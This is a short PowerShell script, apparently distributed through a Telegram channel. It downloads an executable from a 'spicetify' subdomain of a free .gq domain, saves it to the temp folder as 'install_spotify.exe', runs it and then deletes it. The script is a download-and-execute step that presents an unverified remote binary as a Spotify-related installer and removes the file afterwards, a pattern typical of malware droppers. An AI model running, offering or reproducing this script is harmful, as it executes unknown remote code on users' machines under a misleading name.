# https://t.me/ZGQinc

$url = "https://spicetify.zgqinc.gq/run.exe"
$output = Join-Path $env:TEMP "install_spotify.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output -Wait
Remove-Item -Path $output -Force